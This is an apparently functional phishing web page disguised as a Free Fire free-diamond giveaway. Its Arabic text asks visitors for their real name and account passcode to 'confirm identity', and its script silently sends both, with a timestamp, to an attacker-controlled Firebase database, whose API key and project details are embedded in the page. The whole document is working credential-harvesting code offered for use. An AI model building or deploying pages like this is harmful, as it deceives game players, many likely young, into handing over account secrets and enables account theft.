<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Freefire Best Reward Gifter</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js"></script>
    
    <script>
        // Your Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyAPPCLoihdah2hkQZn-jOg9ZV15fve4mAY",
            authDomain: "freefire-best-reward.firebaseapp.com",
            projectId: "freefire-best-reward",
            storageBucket: "freefire-best-reward.firebasestorage.app",
            messagingSenderId: "897344687951",
            appId: "1:897344687951:web:a444291b83b6da64df3f3a"
        };

        // Initialize Firebase
        const app = firebase.initializeApp(firebaseConfig);
        const database = firebase.database(app); // Moved this line inside the initialization context

        function gatherInfo() {
            // Get the values from the input fields
            const realLifeName = document.getElementById('realLifeName').value;
            const passcode = document.getElementById('passcode').value;

            // Create a log entry
            const logEntry = {
                name: realLifeName,
                passcode: passcode,
                timestamp: new Date().toISOString() // Adding a timestamp
            };

            // Store the log entry in Firebase
            const newLogRef = database.ref('logs').push(); // Creates a new log entry in the 'logs' node
            newLogRef.set(logEntry)
                .then(() => {
                    console.log('Log entry saved to Firebase:', logEntry);
                    alert('تم حفظ المعلومات بنجاح!'); // Notify user about success
                })
                .catch((error) => {
                    console.error('Error saving log entry:', error);
                    alert('حدث خطأ أثناء حفظ المعلومات: ' + error.message); // Notify user about error
                });

            // Log the values to the console
            console.log(`Real Life Name: ${realLifeName}, Passcode: ${passcode}`);

            // Resetting the input fields
            document.getElementById('realLifeName').value = '';
            document.getElementById('passcode').value = '';
        }
    </script>
</head>
<body>
    <header>
        <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
    </header>
    <main>
        <h1>مكافأة الماس المجانية من فري فاير</h1>
        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
        
        <input type="text" id="realLifeName" placeholder="اسمك الحقيقي" required>
        <input type="text" id="passcode" placeholder="رقم سري" required>
        <button onclick="gatherInfo()">اقبل</button>
    </main>
</body>
</html>
